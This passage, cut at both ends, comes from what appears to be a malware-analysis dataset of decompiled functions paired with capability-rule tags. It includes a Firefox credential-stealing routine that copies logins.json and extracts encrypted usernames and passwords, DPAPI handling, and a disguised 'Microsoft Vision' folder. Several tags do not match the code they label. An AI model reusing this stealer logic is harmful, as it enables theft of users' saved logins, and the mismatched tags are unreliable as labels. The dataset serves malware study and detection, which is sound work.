        "decompiled_code": "\nuint __cdecl fcn.0040a36f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *arg_8h_00;\n    uint pszPath;\n    uint32_t uVar9;\n    uint var_4c4h;\n    uint lpApplicationName;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t lpBinaryType;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint lpAppName;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_8h;\n    \n    var_1ch = in_ECX;\n    fcn.004036f7(L\"Profile\");\n    uVar3 = 0;\n    fcn.00401052(&var_4c4h, 0, 0x208);\n    lpBinaryType = 0;\n    iVar4 = 0;\n    fcn.00401052(&lpApplicationName, 0, 0x104);\n    iVar1 = fcn.0040b87d();\n    if (iVar1 != 0) {\n        fcn.004036f7(&lpApplicationName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpApplicationName, L\"\\\\firefox.exe\");\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)(&lpApplicationName, &lpBinaryType);\n        arg_8h_00 = &var_28h;\n        uVar9 = lpBinaryType == 6;\n        pszPath = extraout_ECX;\n        fcn.0040373f(arg_8h_00);\n        iVar1 = fcn.0040b165(arg_8h_00, pszPath);\n        if (iVar1 != 0) {\n            fcn.0040357c(L\"\\\\Mozilla\\\\Firefox\\\\\");\n            fcn.0040373f(&arg_8h);\n            fcn.0040357c(L\"profiles.ini\");\n            uVar3 = fcn.004036f7(L\"Profile\");\n            fcn.00403549(uVar3);\n            fcn.00405feb();\n            fcn.00403384(0);\n            while (iVar1 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)\n                                     (lpAppName, L\"Path\", 0, &var_4c4h, 0x104, var_20h),  iVar1 != 0) {\n                iVar4 = iVar4 + 1;\n                var_24h = iVar4;\n                uVar3 = fcn.004036f7(L\"Profile\");\n                fcn.00403549(uVar3);\n                fcn.00405feb();\n                var_5ch = 0;\n                fcn.00403384(iVar4);\n                fcn.0040373f(&arg_8h);\n                fcn.0040357c(&var_4c4h);\n                fcn.00403666(&var_18h);\n                iVar1 = (**(in_ECX + 0x68))(var_18h);\n                if (((iVar1 == 0) && (var_98h = (**(in_ECX + 0x80))(),  var_98h != 0)) &&\n                   (iVar1 = (**(in_ECX + 0x7c))(var_98h, 1, 0),  iVar1 == 0)) {\n                    fcn.0040373f(&var_8h);\n                    fcn.0040357c(L\"\\\\logins.json\");\n                    fcn.00410c8a();\n                    fcn.0040357c(0x4176a4);\n                    uVar3 = fcn.004035b9();\n                    fcn.00403447(uVar3);\n                    fcn.00405feb();\n                    var_34h = 0;\n                    fcn.0040357c(L\".tmp\");\n                    uVar3 = lpNewFileName;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, lpNewFileName, 0);\n                    if (iVar4 != 0) {\n                        fcn.00403549(&lpNewFileName);\n                    }\n                    fcn.004113ed();\n                    fcn.00403549(&lpExistingFileName);\n                    uVar7 = 0xc0000000;\n                    uVar8 = extraout_ECX_00;\n                    iVar4 = fcn.004116b1(0xc0000000);\n                    if (iVar4 != 0) {\n                        var_30h = 0;\n                        var_2ch = 0;\n                        fcn.0041135c(&var_30h, var_a0h, 0);\n                        fcn.004034d1(\"encryptedUsername\");\n                        fcn.0040305d(&var_9ch);\n                        iVar1 = fcn.0040961c();\n                        var_74h = iVar1;\n                        fcn.00405feb();\n                        fcn.00405feb();\n                        iVar4 = var_74h;\n                        while (iVar1 != 0) {\n                            pcVar6 = \"hostname\";\n                            var_6ch = 0;\n                            var_68h = 0;\n                            var_64h = 0;\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004034d1(\"hostname\");\n                            puVar5 = &var_78h;\n                            fcn.0040305d(puVar5);\n                            fcn.00409655(puVar5, uVar3);\n                            fcn.00405feb(pcVar6, iVar1);\n                            fcn.00405feb();\n                            pcVar6 = \"encryptedUsername\";\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004034d1(\"encryptedUsername\");\n                            puVar5 = &var_80h;\n                            fcn.0040305d(puVar5);\n                            fcn.00409655(puVar5, uVar3);\n                            fcn.00405feb(pcVar6, iVar1);\n                            fcn.00405feb();\n                            pcVar6 = \"encryptedPassword\";\n                            iVar1 = iVar4;\n                            uVar3 = fcn.004034d1(\"encryptedPassword\");\n                            puVar5 = &var_88h;\n                            fcn.0040305d(puVar5);\n                            fcn.00409655(puVar5, uVar3);\n                            fcn.00405feb(pcVar6, iVar1);\n                            fcn.00405feb();\n                            fcn.0040a8c3(var_50h, &var_44h);\n                            fcn.0040a8c3(var_4ch, &var_48h);\n                            uVar3 = fcn.004031af(&var_38h);\n                            fcn.00403549(uVar3);\n                            fcn.00405feb();\n                            puVar5 = &var_3ch;\n                            var_38h = 0;\n                            uVar3 = var_44h;\n                            fcn.004034d1(var_44h);\n                            uVar2 = fcn.004031af(uVar3);\n                            fcn.00403549(uVar2);\n                            fcn.00405feb(uVar2, uVar3, puVar5);\n                            var_3ch = 0;\n                            fcn.00405feb();\n                            puVar5 = &var_40h;\n                            uVar3 = var_48h;\n                            fcn.004034d1(var_48h);\n                            uVar2 = fcn.004031af(uVar3);\n                            fcn.00403549(uVar2);\n                            fcn.00405feb(uVar2, uVar3, puVar5);\n                            var_40h = 0;\n                            fcn.00405feb();\n                            var_60h = 0;\n                            puVar5 = &var_6ch;\n                            fcn.00401ff2(puVar5);\n                            fcn.00402028(puVar5);\n                            fcn.00405feb();\n                            fcn.00405feb();\n                            fcn.00405feb();\n                            fcn.00405feb();\n                            fcn.00405feb();\n                            fcn.00401441();\n                            iVar4 = iVar4 + -1;\n                            uVar3 = lpNewFileName;\n                            iVar1 = iVar4;\n                        }\n                        iVar4 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar3);\n                        if (iVar4 != 0) {\n                            puVar5 = &lpNewFileName;\n                            fcn.0040373f(puVar5);\n                            fcn.0041142a(puVar5);\n                        }\n                        (**(var_1ch + 0x84))(var_98h);\n                        (**(var_1ch + 0x6c))();\n                        fcn.00403148();\n                    }\n                    fcn.0041140c(uVar7, uVar8);\n                    fcn.00405feb();\n                    lpNewFileName = 0;\n                    fcn.00405feb();\n                    lpExistingFileName = 0;\n                    fcn.00405feb();\n                    fcn.00405feb();\n                    in_ECX = var_1ch;\n                    iVar4 = var_24h;\n                }\n                else {\n                    fcn.00405feb();\n                    fcn.00405feb();\n                }\n                var_8h = 0;\n            }\n            fcn.0040b10e();\n            uVar3 = 1;\n            fcn.00405feb();\n        }\n        fcn.00405feb(arg_8h_00, pszPath, uVar9);\n    }\n    fcn.00405feb();\n    fcn.00405feb();\n    return uVar3;\n}\n",
        "token_count": 2410
    },
    "0040c157": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c157(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint noname_4;\n    int32_t var_ch;\n    uint hMem;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    iVar2 = fcn.0040c3b9(&fcn.0040c157::var_4h);\n    uVar1 = hMem;\n    if (iVar2 != 0) {\n        if (4 < var_4h) {\n            noname_4 = 0x40c188;\n            iVar2 = fcn.00401000(hMem, \"DPAPI\", 5);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040c1dd(in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, in_stack_ffffffd4, \n                                     noname_4, &fcn.0040c157::hMem, &fcn.0040c157::var_ch);\n                if (iVar2 != 0) {\n                    if (var_ch == 0x20) {\n                        uVar3 = fcn.0040c419(arg_10h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 372
    },
    "0040feb5": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __fastcall fcn.0040feb5(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint *arg_8h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t nNumberOfBytesToRead;\n    \n    while( true ) {\n        nNumberOfBytesToRead = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)(param_1[2], 0, 0, 0, &fcn.0040feb5::nNumberOfBytesToRead, 0);\n        if (iVar2 == 0) break;\n        if (nNumberOfBytesToRead == 0) {\n            return 1;\n        }\n        var_ch = nNumberOfBytesToRead + 1;\n        var_10h = 0x40fed6;\n        iVar2 = fcn.00401085();\n        lpNumberOfBytesRead = 0;\n        var_ch = 0;\n        var_10h = &fcn.0040feb5::lpNumberOfBytesRead;\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(param_1[2], iVar2, nNumberOfBytesToRead);\n        if (iVar1 == 0) break;\n        *(lpNumberOfBytesRead + iVar2) = 0;\n        var_ch = lpNumberOfBytesRead;\n        var_10h = iVar2;\n        fcn.004030cc(iVar2, lpNumberOfBytesRead);\n        fcn.00401099(iVar2);\n        fcn.0040300a(&fcn.0040feb5::var_10h);\n        fcn.0040305d(&fcn.0040feb5::var_ch);\n        fcn.0040319e();\n        arg_8h = &fcn.0040feb5::var_ch;\n        uVar3 = extraout_ECX;\n        fcn.00403507(arg_8h);\n        (**(*param_1 + 4))(arg_8h, uVar3);\n        fcn.00405feb();\n        fcn.00405feb();\n        var_10h = NULL;\n        fcn.00403148();\n    }\n    var_ch = 0x40ff8c;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar2 == 0x6d) || (iVar2 == 0xe8)) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 657
    },
    "00413363": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413363(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    do {\n        uVar1 = fcn.0041338d(arg_8h);\n        *(arg_8h + param_1) = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"[uVar1 % 0x3e];\n        arg_8h = arg_8h + 1;\n    } while (arg_8h < 10);\n    *(param_1 + 10) = 0;\n    return;\n}\n",
        "token_count": 138
    },
    "00401176": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.00401176(uint8_t *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = *param_1 - *param_2;\n        if ((iVar1 != 0) || (*param_2 == 0)) break;\n        param_1 = param_1 + 1;\n        param_2 = param_2 + 1;\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 142
    },
    "00408d0f": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create or open file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408d0f(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uint uStack840;\n    char16_t *pcStack836;\n    uint32_t auStack832 [3];\n    uint uStack820;\n    code *pcStack816;\n    uint uStack812;\n    int32_t iStack740;\n    uchar auStack576 [8];\n    uchar auStack568 [564];\n    \n    uStack812 = 0;\n    pcStack816 = 0x408d27;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcStack816 = 0x800;\n    auStack832[2] = *0x42675c + 0x210;\n    uStack820 = 0;\n    auStack832[1] = 0x408d68;\n    fcn.00401052();\n    auStack832[2] = *0x42675c + 0x10;\n    pcStack816 = 0x208;\n    uStack820 = 0;\n    auStack832[1] = 0x408d7f;\n    fcn.00401052();\n    pcStack816 = *0x42675c + 0x10;\n    uStack820 = 0;\n    auStack832[2] = 0;\n    auStack832[1] = 0x1c;\n    auStack832[0] = 0;\n    pcStack836 = 0x408d96;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    pcStack836 = L\"\\\\Microsoft Vision\\\\\";\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n    if (*(*0x42675c + 0xa14) != 0) {\n        fcn.00401052(&stack0xfffffdc8);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        (*pcVar1)(&stack0xfffffdc0, 0x4179e8);\n        fcn.004036f7(0x408e15);\n        fcn.00411446(0x408e1e);\n        fcn.00401fb7(0x408e31);\n        if (iStack740 != 0) {\n            fcn.00401b27();\n        }\n    }\n    uVar3 = fcn.004035b9();\n    fcn.0040357c(0x4179ec);\n    fcn.00403447(uVar3);\n    fcn.00405feb();\n    uStack840 = 0;\n    if (*(*0x42675c + 0xa14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GetLocalTime)(&stack0xfffffcbc);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (&stack0xfffffd1c, L\"%02d-%02d-%02d_%02d.%02d.%02d\", pcStack836 >> 0x10, 0, 0, auStack832[0] & 0xffff\n                   , auStack832[0] >> 0x10, auStack832[1] & 0xffff);\n        puVar6 = &stack0xfffffd1c;\n        iVar4 = *0x42675c + 0x10;\n        fcn.0040357c(iVar4);\n        fcn.0040357c(iVar4);\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x42675c + 0xc), 0x10000000, 1, 0, 2, 0x80, 0, iVar4, puVar6);\n        *(*0x42675c + 4) = uVar3;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    pcStack816 = fcn.00408793;\n    (*_sym.imp.USER32.dll_RegisterClassW)(&stack0xfffffccc);\n    uVar2 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, 0, 0, 0, 0, 0, 0, 0, 0xfffffffd, 0, uVar2, arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    puVar5 = &stack0xfffffcc0;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xfffffcc0, uVar2, 0, 0);\n    uVar3 = uStack840;\n    if (iVar4 != 0) {\n        do {\n            uVar3 = 0xffffffff;\n            if (iVar4 == -1) break;\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffcb0);\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffcac);\n            iVar4 = (*pcVar1)(&stack0xfffffca8, uVar2, 0, 0);\n            uVar3 = uStack840;\n        } while (iVar4 != 0);\n    }\n    fcn.00405feb();\n    return uVar3;\n}\n",
        "token_count": 1242
    },
    "0040fa83": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040fa83(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = 0x419ab0 - param_2;\n    do {\n        uVar3 = *(iVar4 + param_2);\n        uVar1 = *param_2;\n        uVar2 = uVar3 + 0x20;\n        if (0x19 < uVar3 - 0x41) {\n            uVar2 = uVar3;\n        }\n        param_2 = param_2 + 1;\n        uVar3 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar3 = uVar1;\n        }\n    } while ((uVar2 != 0) && (uVar2 == uVar3));\n    return uVar2 - uVar3;\n}\n",
        "token_count": 235
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004011c0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "00401485": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401485(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403549(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1[1] = *(arg_8h_00 + 0xc);\n                piVar1 = piVar1 + 4;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401afa();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403549(&arg_8h);\n    var_8h[piVar1 * 4 + 1] = arg_ch;\n    var_8h[piVar1 * 4 + 2] = arg_10h;\n    var_8h[piVar1 * 4 + 3] = arg_14h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 630
    },
    "00401586": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401586(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406099();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 183
    },
    "004015d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004015d3(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405de9();\n    arg_8h_00 = arg_ch * 0x10 + *in_ECX;\n    fcn.0040373f(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    return arg_8h;\n}\n",
        "token_count": 170
    },
    "00401735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401735(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar1 = fcn.00406099();\n    if (piVar1 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar1 = piVar3;\n        piVar2 = piVar1 + 1;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 187
    },
    "00401787": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401787(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint *puVar1;\n    \n    fcn.00405de9();\n    puVar1 = arg_ch * 0xc + *in_ECX;\n    *arg_8h = *puVar1;\n    fcn.0040373f(puVar1 + 1);\n    fcn.0040373f(puVar1 + 2);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "004017c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017c8(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 6;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 4;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-0x10 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403549(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-2] = *(arg_8h_00 + 8);\n                piVar1[-1] = *(arg_8h_00 + 0xc);\n                *piVar1 = *(arg_8h_00 + 0x10);\n                piVar1 = piVar1 + 6;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401b27();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403549(&arg_8h);\n    var_8h[piVar1 * 6 + 2] = arg_10h;\n    var_8h[piVar1 * 6 + 3] = arg_14h;\n    var_8h[piVar1 * 6 + 4] = arg_18h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 646
    },
    "004018c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004018c7(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406099();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 6;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "00401914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401914(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405de9();\n    arg_8h_00 = arg_ch * 0x18 + *in_ECX;\n    fcn.0040373f(arg_8h_00);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    *(arg_8h + 0x10) = *(arg_8h_00 + 0x10);\n    return arg_8h;\n}\n",
        "token_count": 173
    },
    "00401955": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401955(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403549(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401b52();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403549(&arg_8h);\n    var_8h[piVar1 * 3 + 1] = arg_ch;\n    var_8h[piVar1 * 3 + 2] = arg_10h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 581
    },
    "00401a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a48(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406099();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "00401a95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
